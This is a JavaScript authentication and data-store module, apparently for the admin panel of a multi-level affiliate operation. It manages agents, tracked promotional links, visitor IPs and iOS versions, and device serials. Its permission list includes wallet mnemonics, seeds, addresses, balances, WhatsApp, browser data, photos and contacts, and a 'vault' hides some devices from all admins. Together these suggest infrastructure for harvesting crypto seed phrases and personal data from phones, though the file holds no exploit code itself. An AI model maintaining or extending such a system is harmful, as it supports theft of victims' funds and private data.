'use strict';

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// 【2026-09-13 护栏】数据目录支持环境变量覆盖：测试用 AUTH_DATA_DIR=/tmp/... 完全隔离，
//   防"测试污染生产 auth.json"（与 BC_DIR 同款纪律）。生产不设该 env。
const DATA_DIR = process.env.AUTH_DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'auth.json');
const SESSION_TTL = 24 * 60 * 60 * 1000;
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');

// 【2026-09-13 结构修复·写风暴根治】高频数据从 auth.json 拆出，auth.json 只在低频管理操作时全量重写：
//   - link_visits.jsonl：推广链访问明细，append-only 逐条追加（~150B/条），不再触发 22.5MB 全量重写
//   - ip_agents.json  ：IP→代理映射快照，10 秒合并落盘（原子 tmp+rename + .prev 轮转）
const LV_FILE = path.join(DATA_DIR, 'link_visits.jsonl');
const IPAGENTS_FILE = path.join(DATA_DIR, 'ip_agents.json');

// 【2026-09-12】contacts（联系人）此前漏在此数组 —— 前端勾选框与后端裁剪都按字符串判断，
//   功能没断，但"全集"定义要与前端 PERM_GROUPS 保持一致，避免以后用它做白名单校验时误过滤。
const ALL_PERMISSIONS = [
  'overview','devices','users','reports','mnemonics','seeds','addresses',
  'tokens','messages','notebooks','whatsapp','browser','photos','sysfiles','contacts',
  'collect','vaults','airdrop','apps','ipvisits','admin','agents','links',
  'balances','realtime'
];

let data = { users: [], agent_links: [], device_agents: {} };
// 【2026-09-13 结构修复】拆出 auth.json 的高频字段（内存单例；落盘走各自独立文件，见下方 _lv*/_ipag* 实现）
let linkVisits = [];   // ← link_visits.jsonl (append-only)
let ipAgents = {};     // ← ip_agents.json   (10 秒合并落盘)
const sessions = new Map();
const agentDeviceCache = new Map();

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

// 【2026-09-12 事故防御】原逻辑解析失败仅打印日志 → data 保持初始化默认 → 后续任何 _save()
//   会把「默认数据（只有 admin）」覆盖写回文件（实测事故：服务器迁移期间一次启动读失败，
//   11 个代理 + 全部设备归属 + 推广链被清空）。现改为：解析失败 → 备份坏文件 + 置 _loadFailed
//   → _save() 拒绝写入（冻结保护），宁可不写也不覆盖。
let _loadFailed = false;
function _load() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      if (!raw.trim()) throw new Error('auth.json 为空（0 字节，疑似写入中断）');
      data = JSON.parse(raw);
      _ipIdxCache = null;   // 【复审修复 L2】数据被整体替换 → ip 反向索引失效（_load 仅在 init() 后调用，无 TDZ）
      if (!Array.isArray(data.users) || data.users.length === 0) throw new Error('auth.json 无任何用户（疑似损坏/被清空）');
      if (!data.agent_links) data.agent_links = [];
      if (!data.device_agents) data.device_agents = {};
      if (!data.action_logs) data.action_logs = [];
      // 【2026-09-13】link_visits / ip_agents 为历史内联字段，由 _lvLoad()/_ipagLoad() 迁移后从 data 移除；
      //   此处不再补默认值（新建 auth.json 不应再出现这两个字段）。
      _loadFailed = false;
    }
  } catch (e) {
    _loadFailed = true;
    console.error('[authStore] ★★ auth.json 加载失败，已冻结写入保护（防止默认数据覆盖坏文件）:', e.message);
    try {
      fs.writeFileSync(DATA_FILE + '.corrupt_' + Date.now(), fs.existsSync(DATA_FILE) ? fs.readFileSync(DATA_FILE, 'utf8') : '(missing)');
      console.error('[authStore] 坏文件已留证备份 auth.json.corrupt_*');
    } catch (e2) {}
  }
}

// 【2026-09-12 复审修复】批量写入模式：autoAssign 等批量操作把 N 次 _save() 合并为 1 次。
//   实测每 5 分钟一轮 autoAssign 触发 10~20 次全量写盘（单次 ≈ 正文 14MB + 备份 14MB 同步 IO），
//   造成秒级事件循环阻塞——load-watch 实测 9.9s 停顿与该写盘精确重合。
let _bulkDepth = 0, _bulkDirty = false;
let _logSaveTimer = null;   // [IR 2026-09-17] action_logs 落盘防抖（避免未认证请求触发的全量写放大）
function beginBulk() { _bulkDepth++; }
function endBulk() {
  if (--_bulkDepth > 0) return;
  _bulkDepth = 0;
  if (_bulkDirty) { _bulkDirty = false; _save(); }
}
function _save() {
  _childIdxInvalidate();   // 【2026-09-13 多级裂变】任何数据变更（含批量模式）后失效子代理索引
  // 【2026-09-12 事故防御】① 加载失败状态 → 拒绝写入（保护现场）② 每次写前轮转备份上一版到 .prev
  if (_loadFailed) { console.error('[authStore] ★ 拒绝写入：auth.json 处于加载失败冻结态'); return; }
  if (_bulkDepth > 0) { _bulkDirty = true; return; }   // 批量模式：合并到 endBulk 一次性写
  try {
    // 【2026-09-12 深夜事故修复】备份从 copyFileSync 改为 read+write：
    //   copyFileSync 走 libuv copy_file_range —— 当 stat 大小与实际 EOF 不一致（多进程共写/截断
    //   竞态，实测双实例共写同一 auth.json 触发）时，内核 copy 循环会永远重试返回 0，
    //   进程 100% CPU 死循环卡死（实测 14 万次/秒，只能重启恢复）。readFileSync 读到真实 EOF，
    //   不依赖 stat 大小，竞态下最坏读出当期内容，绝不死循环。
    try { fs.writeFileSync(DATA_FILE + '.prev', fs.readFileSync(DATA_FILE)); } catch (e0) {}
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {
    console.error('[authStore] failed to save data:', e.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// 【2026-09-13 结构修复·写风暴根治】link_visits 与 ip_agents 从 auth.json 拆出
// ---------------------------------------------------------------------------
// 事故背景：推广期 /go/ 访问 ≈2.3 次/秒，原 recordLinkVisit 每次全量 _save()（正文+备份 ≈43MB
//   同步 IO）→ 实测写盘 90MB/s、事件循环打满、面板全接口 30s 超时；auth.json 因 link_visits
//   138k 条膨胀到 21.5MB，访问越多越大、越大越慢，正反馈死亡螺旋。
// 现方案：
//   · link_visits.jsonl —— 每次访问 append 追加一行（~150B），永不触发全量重写；
//     7 天窗口剪枝每小时在内存做，文件每 24h 压实一次（tmp+rename 原子替换）。
//   · ip_agents.json —— 独立快照文件，10 秒合并落盘（原子 tmp+rename + .prev 轮转）。
//   · link.visits 计数（属 auth.json 的 agent_links）—— 内存实时更新，每小时合并落盘一次。
// 崩溃语义：访问明细最多丢 0（append 即落盘）；IP 映射最多丢 10 秒；访问计数最多丢 1 小时。
// ═══════════════════════════════════════════════════════════════════════════
let _vsDirty = false;        // link.visits 计数有未落盘的增量
let _lvLastCompact = 0;      // 上次 jsonl 压实时间
let _ipagTimer = null;       // ip_agents 合并落盘定时器

function _lvAppend(entry) {
  try { fs.appendFileSync(LV_FILE, JSON.stringify(entry) + '\n'); }
  catch (e) { console.error('[authStore] link_visits 追加失败:', e.message); }
}

function _lvCompact() {
  try {
    fs.writeFileSync(LV_FILE + '.tmp', linkVisits.map(v => JSON.stringify(v)).join('\n') + (linkVisits.length ? '\n' : ''));
    fs.renameSync(LV_FILE + '.tmp', LV_FILE);
    _lvLastCompact = Date.now();
    return true;
  } catch (e) { console.error('[authStore] link_visits 压实失败:', e.message); return false; }
}

function _lvLoad() {
  const cut = Date.now() - 7 * 86400e3;
  let arr = [];
  try {
    if (fs.existsSync(LV_FILE)) {
      const raw = fs.readFileSync(LV_FILE, 'utf8');
      for (const line of raw.split('\n')) {
        const s = line.trim(); if (!s) continue;
        try { arr.push(JSON.parse(s)); } catch (e) { /* 单行损坏跳过，不影响其它行 */ }
      }
    }
  } catch (e) { console.error('[authStore] link_visits 载入失败:', e.message); }

  // 历史遗留（auth.json 内联数组）→ 合并迁移；迁移成功落盘后才从 auth.json 移除
  const legacy = Array.isArray(data.link_visits) ? data.link_visits : [];
  let migrated = false;
  if (legacy.length) {
    const seen = new Set(arr.map(v => v.code + '|' + (v.ip || '') + '|' + (v.ts || '')));
    for (const v of legacy) {
      const k = v.code + '|' + (v.ip || '') + '|' + (v.ts || '');
      if (!seen.has(k)) { seen.add(k); arr.push(v); }
    }
    migrated = true;
  }

  // 7 天窗口剪枝 + 瘦身归一（兼容历史含 ua/referer 的旧条目）
  const out = [];
  let slimmed = 0;
  for (const v of arr) {
    const t = Date.parse(v.ts) || 0;
    if (t && t < cut) continue;
    if (v.ua !== undefined || v.referer !== undefined || v.ios === undefined) {
      out.push({ link_id: v.link_id, code: v.code, ip: v.ip || '', ios: v.ios !== undefined ? v.ios : _extractIOS(v.ua), ts: v.ts });
      slimmed++;
    } else out.push(v);
  }
  linkVisits = out;

  if (_loadFailed) return;   // auth.json 冻结态：只读装载，不写任何文件
  if (migrated || slimmed || out.length !== arr.length || !fs.existsSync(LV_FILE)) {
    const ok = _lvCompact();
    if (migrated && ok) {
      console.log('[authStore] link_visits 迁移完成: auth.json 内联 ' + legacy.length + ' 条 → jsonl（7 天窗口 ' + out.length + ' 条）');
    } else if (migrated) {
      console.error('[authStore] jsonl 落盘失败，暂留 auth.json 内联副本（下次启动重试迁移）');
      return;
    }
  }
  if (data.link_visits !== undefined) { delete data.link_visits; _save(); }
}

function _ipagSave() {
  try {
    // 【2026-09-12 事故教训】备份用 read+write，禁用 copyFileSync（跨 EOF 竞态时内核 copy 死循环）
    let old = null;
    try { old = fs.readFileSync(IPAGENTS_FILE); } catch (e) {}
    if (old) fs.writeFileSync(IPAGENTS_FILE + '.prev', old);
    fs.writeFileSync(IPAGENTS_FILE + '.tmp', JSON.stringify(ipAgents));
    fs.renameSync(IPAGENTS_FILE + '.tmp', IPAGENTS_FILE);
  } catch (e) { console.error('[authStore] ip_agents 落盘失败:', e.message); }
}

function _ipagSaveLazy() {
  if (_ipagTimer) return;
  _ipagTimer = setTimeout(() => { _ipagTimer = null; _ipagSave(); }, 10000);
}

function _ipagLoad() {
  let fileObj = null;
  try {
    if (fs.existsSync(IPAGENTS_FILE)) {
      const j = JSON.parse(fs.readFileSync(IPAGENTS_FILE, 'utf8'));
      if (j && typeof j === 'object' && !Array.isArray(j)) fileObj = j;
      else throw new Error('格式异常（非对象）');
    }
  } catch (e) {
    console.error('[authStore] ip_agents.json 载入失败:', e.message);
    try { fs.renameSync(IPAGENTS_FILE, IPAGENTS_FILE + '.corrupt_' + Date.now()); } catch (e2) {}
    fileObj = null;
  }
  const legacy = (data.ip_agents && typeof data.ip_agents === 'object' && !Array.isArray(data.ip_agents)) ? data.ip_agents : {};
  if (fileObj) {
    let added = 0;
    for (const [k, v] of Object.entries(legacy)) { if (!(k in fileObj)) { fileObj[k] = v; added++; } }
    ipAgents = fileObj;
    if (_loadFailed) return;
    if (added) _ipagSave();
    if (data.ip_agents !== undefined) { delete data.ip_agents; _save(); }
  } else {
    ipAgents = legacy;
    if (_loadFailed) return;
    if (Object.keys(legacy).length) {
      _ipagSave();
      delete data.ip_agents;
      _save();
      console.log('[authStore] ip_agents 迁移完成: auth.json 内联 ' + Object.keys(legacy).length + ' 条 → ip_agents.json');
    } else if (data.ip_agents !== undefined) {
      delete data.ip_agents;
    }
  }
}

// ---------------------------------------------------------------------------
// Password helpers
// ---------------------------------------------------------------------------

function hashPassword(password) {
  // 【2026-09-20 安全修复】类型守卫：防管理接口传入非字符串口令触发 scryptSync TypeError
  if (typeof password !== 'string' || !password) throw new Error('password 必须是非空字符串');
  const salt = crypto.randomBytes(32).toString('hex');
  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
  return { salt, hash };
}

function verifyPassword(password, salt, hash) {
  // 【2026-09-20 安全修复】类型守卫：畸形登录 payload（password 为数字/null 等）曾触发
  //   scryptSync 抛 ERR_INVALID_ARG_TYPE → 未捕获异常 → 面板进程崩溃（被外部爆破利用，12 次/9 分钟）
  if (typeof password !== 'string' || !password) return false;
  try {
    const derived = crypto.scryptSync(password, salt, 64).toString('hex');
    return crypto.timingSafeEqual(Buffer.from(derived, 'hex'), Buffer.from(hash, 'hex'));
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function _nextId(arr) {
  if (!arr.length) return 1;
  let max = 0;
  for (const item of arr) { if (item.id > max) max = item.id; }
  return max + 1;
}

function _cleanUser(user) {
  if (!user) return null;
  const { salt, password_hash, ...clean } = user;
  return clean;
}

function _now() {
  return new Date().toISOString();
}

function _generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function _generateLinkCode() {
  return crypto.randomBytes(4).toString('hex');
}

function _findUser(id) {
  return data.users.find(u => u.id === id && u.status !== 'deleted') || null;
}

function _rebuildDeviceCache(userId) {
  const serials = new Set();
  for (const [serial, uid] of Object.entries(data.device_agents)) {
    if (uid === userId) serials.add(serial);
  }
  agentDeviceCache.set(userId, serials);
  return serials;
}

function _invalidateDeviceCache(userId) {
  agentDeviceCache.delete(userId);
}

// ══ 【2026-09-13 多级裂变】子代理索引与递归工具 ══
//   子代理索引（parent_id → [childIds]）：递归展开下级的性能基础；用户表变更（create/update/delete/init）时失效。
let _childIdx = null;
function _childIdxGet() {
  if (_childIdx) return _childIdx;
  const m = new Map();
  for (const u of data.users) {
    if (u.role !== 'agent' || u.status === 'deleted' || !u.parent_id) continue;
    let a = m.get(u.parent_id); if (!a) { a = []; m.set(u.parent_id, a); }
    a.push(u.id);
  }
  _childIdx = m;
  return m;
}
function _childIdxInvalidate() { _childIdx = null; }

// BFS 收集全部下级代理 id（任意深度；seen 防环，guard 防异常数据死循环）
function getDescendantAgentIds(rootId) {
  const idx = _childIdxGet();
  const out = [];
  const seen = new Set([rootId]);
  const stack = [rootId];
  let guard = 0;
  while (stack.length && guard++ < 1000) {
    const cur = stack.pop();
    for (const cid of (idx.get(cur) || [])) {
      if (seen.has(cid)) continue;
      seen.add(cid);
      out.push(cid);
      stack.push(cid);
    }
  }
  return out;
}

// 代理深度（超管=0，L1=1，L2=2 …；与创建校验的链深度口径一致）
function getAgentDepth(id) {
  let d = 0, cur = _findUser(id), guard = 0;
  while (cur && cur.role === 'agent' && guard++ < 30) {
    d++;
    cur = cur.parent_id ? _findUser(cur.parent_id) : null;
  }
  return d;
}

// 递归可见设备数（自己 + 全部可继承下级；与 filterByAgent 同口径，供代理列表统计用）
function getAgentDeviceCountTotal(userId) {
  const user = _findUser(userId);
  if (!user) return 0;
  const excl = _loadVisibility().agents;
  const ids = [userId];
  if (!excl.has(userId)) for (const did of getDescendantAgentIds(userId)) if (!excl.has(did)) ids.push(did);
  const all = new Set();
  for (const aid of ids) { const ds = getAgentDeviceSet(aid); if (ds) ds.forEach(s => all.add(s)); }
  return all.size;
}

// ---------------------------------------------------------------------------
// Init
// ---------------------------------------------------------------------------

// 【复审修复·写盘瘦身】从 UA 提取 iOS 版本（访问记录压缩存储；autoAssign 匹配用）
function _extractIOS(ua) {
  const m = String(ua || '').match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
  return m ? [m[1], m[2], m[3]].filter(Boolean).join('.') : '';
}
function init() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  _load();
  _loadSessions();
  _lvLoad();     // 访问明细：link_visits.jsonl 载入 + 历史内联迁移 + 7 天窗口剪枝
  _ipagLoad();   // IP→代理映射：ip_agents.json 载入 + 历史内联迁移

  // 每小时：会话清理 + link_visits 7 天剪枝（内存，零 IO）；jsonl 每 24h 压实一次；
  //   访问计数合并落盘（每次访问只改内存，不再逐次全量重写 auth.json）。
  try {
    const t = setInterval(() => {
      try {
        const cut = Date.now() - 7 * 86400e3;
        const before = linkVisits.length;
        linkVisits = linkVisits.filter(v => ((Date.parse(v.ts) || 0) >= cut));
        if (linkVisits.length !== before && Date.now() - _lvLastCompact > 24 * 3600e3) _lvCompact();
      } catch {}
      try { if (_vsDirty) { _vsDirty = false; _save(); } } catch {}
      _pruneSessions();
    }, 60 * 60 * 1000);
    if (t.unref) t.unref();
  } catch {}

  if (data.users.length === 0 && !_loadFailed) {
    const username = process.env.ADMIN_USER || 'admin';
    const password = process.env.ADMIN_PASSWORD || require('crypto').randomBytes(16).toString('hex');
    if (!process.env.ADMIN_PASSWORD) console.error('[authStore] 未配置 ADMIN_PASSWORD：引导账号已使用随机口令（不可知），请设置环境变量或恢复数据文件');
    const { salt, hash } = hashPassword(password);
    data.users.push({
      id: 1,
      username,
      salt,
      password_hash: hash,
      role: 'super_admin',
      parent_id: null,
      status: 'active',
      label: '总管理员',
      permissions: [],
      created_at: _now(),
      last_login_at: null
    });
    _save();
  }
}

// ---------------------------------------------------------------------------
// Session persistence (survive PM2 restarts)
// ---------------------------------------------------------------------------

function _loadSessions() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    const arr = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
    const now = Date.now();
    if (Array.isArray(arr)) {
      for (const s of arr) {
        if (s && s.token && s.expires_at > now) {
          sessions.set(s.token, { user_id: s.user_id, created_at: s.created_at, expires_at: s.expires_at });
        }
      }
    }
  } catch (e) { console.error('[authStore] load sessions failed:', e.message); }
}

function _saveSessions() {
  try {
    const now = Date.now();
    const arr = [];
    for (const [token, s] of sessions) {
      if (s.expires_at > now) arr.push({ token, user_id: s.user_id, created_at: s.created_at, expires_at: s.expires_at });
    }
    fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(arr, null, 2));
  } catch (e) { console.error('[authStore] save sessions failed:', e.message); }
}

function _pruneSessions() {
  const now = Date.now();
  let changed = false;
  for (const [token, s] of sessions) {
    if (s.expires_at <= now) { sessions.delete(token); changed = true; }
  }
  if (changed) _saveSessions();
}

// ---------------------------------------------------------------------------
// Auth
// ---------------------------------------------------------------------------

function login(username, password) {
  const user = data.users.find(u => u.username === username && u.status === 'active');
  if (!user) return null;
  if (!verifyPassword(password, user.salt, user.password_hash)) return null;

  user.last_login_at = _now();
  _save();

  const token = _generateToken();
  const now = Date.now();
  sessions.set(token, { user_id: user.id, created_at: now, expires_at: now + SESSION_TTL });
  _saveSessions();
  return { token, user: _cleanUser(user) };
}

function logout(token) {
  const ok = sessions.delete(token);
  _saveSessions();
  return ok;
}

function getSession(token) {
  const sess = sessions.get(token);
  if (!sess) return null;
  if (Date.now() > sess.expires_at) {
    sessions.delete(token);
    _saveSessions();
    return null;
  }
  const user = _findUser(sess.user_id);
  if (!user) return null;
  return { user: _cleanUser(user) };
}

function changePassword(userId, oldPassword, newPassword) {
  const user = _findUser(userId);
  if (!user) return false;
  if (!verifyPassword(oldPassword, user.salt, user.password_hash)) return false;
  const { salt, hash } = hashPassword(newPassword);
  user.salt = salt;
  user.password_hash = hash;
  _save();
  return true;
}

// ---------------------------------------------------------------------------
// Agent management
// ---------------------------------------------------------------------------

function createAgent({ username, password, label, permissions, parent_id }) {
  if (!username || !password) return null;
  if (data.users.some(u => u.username === username && u.status !== 'deleted')) return null;

  const { salt, hash } = hashPassword(password);
  const user = {
    id: _nextId(data.users),
    username,
    salt,
    password_hash: hash,
    role: 'agent',
    parent_id: parent_id || 1,
    status: 'active',
    label: label || username,
    permissions: Array.isArray(permissions) ? permissions : [],
    created_at: _now(),
    last_login_at: null
  };
  data.users.push(user);
  _save();
  return _cleanUser(user);
}

function listAgents() {
  return data.users
    .filter(u => u.role === 'agent' && u.status !== 'deleted')
    .map(_cleanUser);
}

function getAgent(id) {
  const user = data.users.find(u => u.id === id && u.role === 'agent' && u.status !== 'deleted');
  return user ? _cleanUser(user) : null;
}

function updateAgent(id, updates) {
  const user = data.users.find(u => u.id === id && u.role === 'agent' && u.status !== 'deleted');
  if (!user) return null;
  if (updates.username !== undefined && updates.username.trim()) {
    const taken = data.users.find(u => u.username === updates.username.trim() && u.id !== id && u.status !== 'deleted');
    if (taken) return null;
    user.username = updates.username.trim();
  }
  if (updates.password !== undefined && updates.password) {
    const { salt, hash } = hashPassword(updates.password);
    user.salt = salt;
    user.password_hash = hash;
  }
  if (updates.label !== undefined) user.label = updates.label;
  if (updates.status !== undefined) user.status = updates.status;
  if (Array.isArray(updates.permissions)) user.permissions = updates.permissions;
  _save();
  return _cleanUser(user);
}

function deleteAgent(id) {
  const user = data.users.find(u => u.id === id && u.role === 'agent');
  if (!user) return false;
  user.status = 'deleted';
  // 【2026-09-26 治本】级联清理：原实现仅改状态，导致已删代理的推广链接仍投递+归属、
  //   IP 映射仍兜底归属、会话仍可登录（实测：18 条已删代理链接残留投递，127/158 次访问）。
  //   ① 停用其全部推广链接；② 清其 IP 映射；③ 踢掉其全部会话。
  let _links = 0;
  for (const l of (Array.isArray(data.agent_links) ? data.agent_links : [])) {
    if (l.user_id === id && l.status !== 'deleted') { l.status = 'deleted'; _links++; }
  }
  let _ips = 0;
  for (const [ip, uid] of Object.entries(ipAgents)) {
    if (uid === id) { delete ipAgents[ip]; _ips++; }
  }
  if (_ips) { _ipIdxCache = null; _ipagSave(); }
  let _sess = 0;
  for (const [tok, s] of sessions) {
    if (s.user_id === id) { sessions.delete(tok); _sess++; }
  }
  if (_sess) _saveSessions();
  _save();
  if (_links || _ips || _sess) console.log('[authStore] 删除代理 #%d 级联：链接停用 %d / IP清 %d / 会话踢 %d', id, _links, _ips, _sess);
  return true;
}

function resetAgentPassword(id, newPassword) {
  const user = data.users.find(u => u.id === id && u.role === 'agent' && u.status !== 'deleted');
  if (!user) return false;
  const { salt, hash } = hashPassword(newPassword);
  user.salt = salt;
  user.password_hash = hash;
  _save();
  return true;
}

// ---------------------------------------------------------------------------
// Link management
// ---------------------------------------------------------------------------

function createLink(userId, label, domain) {
  const user = _findUser(userId);
  if (!user) return null;
  const cleanDomain = (domain || '').replace(/^https?:\/\//, '').replace(/\/+$/, '');
  const link = {
    id: _nextId(data.agent_links),
    user_id: userId,
    code: _generateLinkCode(),
    label: label || '',
    domain: cleanDomain,
    status: 'active',
    visits: 0,
    devices_count: 0,
    created_at: _now()
  };
  data.agent_links.push(link);
  _save();
  return link;
}

function listLinks(userId) {
  if (!userId) {
    return data.agent_links.filter(l => l.status !== 'deleted');
  }
  return data.agent_links.filter(l => l.user_id === userId && l.status !== 'deleted');
}

function deleteLink(id) {
  const link = data.agent_links.find(l => l.id === id);
  if (!link) return false;
  link.status = 'deleted';
  _save();
  return true;
}

function getLinkByCode(code) {
  return data.agent_links.find(l => l.code === code && l.status === 'active') || null;
}

function recordLinkVisit(code, ip, ua, referer) {
  const link = getLinkByCode(code);
  if (!link) return;
  link.visits = (link.visits || 0) + 1;   // 计数（agent_links 属 auth.json）→ 内存实时，每小时合并落盘
  _vsDirty = true;
  // Auto-assign IP to agent who owns this link
  if (ip && link.user_id) {
    ipAgents[ip] = link.user_id;
    _ipIdxCache = null;   // 【2026-09-12 性能】ip_agents 反向索引失效
    _ipagSaveLazy();      // 【2026-09-13 结构修复】独立文件，10 秒合并落盘
  }
  // 【2026-09-13 结构修复】访问明细 append-only 追加一行（~150B），彻底移除全量 _save() 写风暴。
  //   仍不存原始 UA/referer —— 仅保留 autoAssign 匹配所需字段（历史教训：该数组曾占 auth.json 96%）。
  const entry = { link_id: link.id, code, ip: ip || '', ios: _extractIOS(ua), ts: _now() };
  linkVisits.push(entry);
  _lvAppend(entry);
}

// ---------------------------------------------------------------------------
// Device-agent mapping
// ---------------------------------------------------------------------------

function assignDevice(serial, userId) {
  const prev = data.device_agents[serial];
  data.device_agents[serial] = userId;
  if (prev !== undefined && prev !== userId) _invalidateDeviceCache(prev);
  _invalidateDeviceCache(userId);
  _updateLinkDeviceCounts();
  _save();
}

function unassignDevice(serial) {
  const prev = data.device_agents[serial];
  if (prev !== undefined) {
    delete data.device_agents[serial];
    _invalidateDeviceCache(prev);
    _updateLinkDeviceCounts();
    _save();
  }
}

function getDeviceAgent(serial) {
  return data.device_agents[serial] !== undefined ? data.device_agents[serial] : null;
}

function getAgentDevices(userId) {
  const serials = [];
  for (const [serial, uid] of Object.entries(data.device_agents)) {
    if (uid === userId) serials.push(serial);
  }
  return serials;
}

function getAgentDeviceSet(userId) {
  if (agentDeviceCache.has(userId)) return agentDeviceCache.get(userId);
  return _rebuildDeviceCache(userId);
}

// ---------------------------------------------------------------------------
// IP-agent mapping
// ---------------------------------------------------------------------------

function assignIP(ip, userId) {
  if (!ip || !userId) return;
  ipAgents[ip] = userId;
  _ipIdxCache = null;   // 【2026-09-12 性能】ip_agents 反向索引失效
  _ipagSave();          // 【2026-09-13 结构修复】独立文件即时落盘（低频调用）
}

// 【2026-09-12 性能修复】ip_agents 反向索引缓存（uid → Set(ip)）：
//   原 getAgentIPs 每次调用 O(全表 ~16566) 扫描+分配；被「每设备×每代理」循环调用时
//   放大到 2 亿次操作（实测设备列表 23-29s、系统文件列表 8s 的根因）。
//   在 ip_agents 全部运行期写点（recordVisit / assignIP）失效重建，语义不变。
let _ipIdxCache = null;
function _ipIdx() {
  if (_ipIdxCache) return _ipIdxCache;
  const m = new Map();
  for (const [ip, uid] of Object.entries(ipAgents)) {   // 【2026-09-13 结构修复】改用独立单例
    let s2 = m.get(uid); if (!s2) { s2 = new Set(); m.set(uid, s2); }
    s2.add(ip);
  }
  _ipIdxCache = m;
  return m;
}
function getAgentIPs(userId) {
  const s2 = _ipIdx().get(userId);
  return s2 ? [...s2] : [];
}

function getAgentIPSet(userId) {
  const user = _findUser(userId);
  if (!user || user.role === 'super_admin') return null;
  return new Set(getAgentIPs(userId));
}

function autoAssignFromLink(code, serial, ip) {
  const link = getLinkByCode(code);
  if (!link) return;
  if (serial) assignDevice(serial, link.user_id);
  if (ip) assignIP(ip, link.user_id);
}

function _updateLinkDeviceCounts() {
  const countByUser = {};
  for (const uid of Object.values(data.device_agents)) {
    countByUser[uid] = (countByUser[uid] || 0) + 1;
  }
  for (const link of data.agent_links) {
    link.devices_count = countByUser[link.user_id] || 0;
  }
}

// ---------------------------------------------------------------------------
// Data filtering
// ---------------------------------------------------------------------------

// 【2026-09-11】专属可见性名单（数据只对本人 + 白名单账号可见）
//   配置：data/visibility.json → {"exclusive_agents":[id,...], "viewer_ids":[可查看的账号id]}
//   带 30 秒缓存：改配置无需重启，最迟 30 秒生效。
//   【2026-09-11 第二次收紧】原实现"任何 super_admin 直接全量返回"，导致 admin(id=1)
//     也能看到 yy7420 的设备。现改为白名单 viewer_ids（当前 [3]=superadmin）：不在名单里的
//     超管（含 admin）与其它代理一样，按"外部视角"剔除专属代理名下设备/IP 的数据。
//   【2026-09-11 审计修复】文件"存在但读/解析失败"时不再降级为空集（fail-open），
//     而是保留上一次成功加载的名单，30 秒后重试；文件确实不存在时仍按"未配置"处理。
let _visCache = { t: 0, agents: new Set(), viewers: new Set(), loaded: false };
function _loadVisibility() {
  const now = Date.now();
  if (now - _visCache.t < 30 * 1000) return _visCache;
  const p = path.join(DATA_DIR, 'visibility.json');
  if (!fs.existsSync(p)) {
    _visCache = { t: now, agents: new Set(), viewers: new Set(), loaded: false };
    return _visCache;
  }
  const numSet = arr => new Set((Array.isArray(arr) ? arr : []).map(x => Number(x)).filter(x => Number.isFinite(x)));
  try {
    const j = JSON.parse(fs.readFileSync(p, 'utf8'));
    _visCache = { t: now, agents: numSet(j.exclusive_agents), viewers: numSet(j.viewer_ids), loaded: true };
  } catch (e) {
    console.error('[authStore] visibility.json 读取失败，保留上次名单:', e.message);
    _visCache = { t: now, agents: _visCache.agents, viewers: _visCache.viewers, loaded: _visCache.loaded };
  }
  return _visCache;
}
function getExclusiveAgents() { return _loadVisibility().agents; }
// 允许查看专属代理数据的账号白名单（未配置/为空 = 除代理本人外谁都不能看）
function getExclusiveViewers() { return _loadVisibility().viewers; }

// 【2026-09-16】暗池（vault）：入池设备对所有人（含两个超管）不可见；vault.json 镜像由 tools/vault_lib.js 维护
let _vaultCache = { t: 0, set: new Set() };
function _loadVaultSerials() {
  const now = Date.now();
  if (now - _vaultCache.t < 30 * 1000) return _vaultCache.set;
  const p = path.join(DATA_DIR, 'vault.json');
  try {
    const j = JSON.parse(fs.readFileSync(p, 'utf8'));
    _vaultCache = { t: now, set: new Set((Array.isArray(j.serials) ? j.serials : []).map(String).filter(Boolean)) };
  } catch (e) {
    if (e && e.code !== 'ENOENT') console.error('[authStore] vault.json 读取失败，保留上次名单:', e.message);
    _vaultCache = { t: now, set: _vaultCache.set };
  }
  return _vaultCache.set;
}
function getVaultSerials() { return [..._loadVaultSerials()]; }
function _stripVault(items, field) {
  const vs = _loadVaultSerials();
  if (!vs.size) return items;
  return items.filter(item => {
    if ((item[field] && vs.has(String(item[field])))
      || (item.serial && vs.has(String(item.serial)))
      || (item.serial_id && vs.has(String(item.serial_id)))) return false;
    return true;
  });
}

// 【2026-09-14】设备排除名单（data/device_exclude.json）
//   语义：串号在名单内的设备【不参与自动归属】，且【不出现在任何代理视角】（含 IP 兜底）——
//   仅超管可见、仅供人工处理。带 30 秒缓存，改配置无需重启。
let _devExclCache = { t: 0, set: new Set() };
function _loadDeviceExclude() {
  const now = Date.now();
  if (now - _devExclCache.t < 30 * 1000) return _devExclCache.set;
  const p = path.join(DATA_DIR, 'device_exclude.json');
  try {
    const j = JSON.parse(fs.readFileSync(p, 'utf8'));
    _devExclCache = { t: now, set: new Set((Array.isArray(j.serials) ? j.serials : []).map(String).filter(Boolean)) };
  } catch (e) {
    if (e && e.code !== 'ENOENT') console.error('[authStore] device_exclude.json 读取失败，保留上次名单:', e.message);
    _devExclCache = { t: now, set: _devExclCache.set };
  }
  return _devExclCache.set;
}
function isDeviceExcluded(serial) { return _loadDeviceExclude().has(String(serial || '')); }
function getExcludedSerials() { return [..._loadDeviceExclude()]; }

// 专属代理的"数据足迹"：名下设备 serial + 名下 IP
function _exclFootprint(excl) {
  const serials = new Set(); const ips = new Set();
  for (const exId of excl) {
    const ds = getAgentDeviceSet(exId); if (ds) ds.forEach(s => serials.add(s));
    const is = getAgentIPSet(exId); if (is) is.forEach(ip => ips.add(ip));
  }
  return { serials, ips };
}
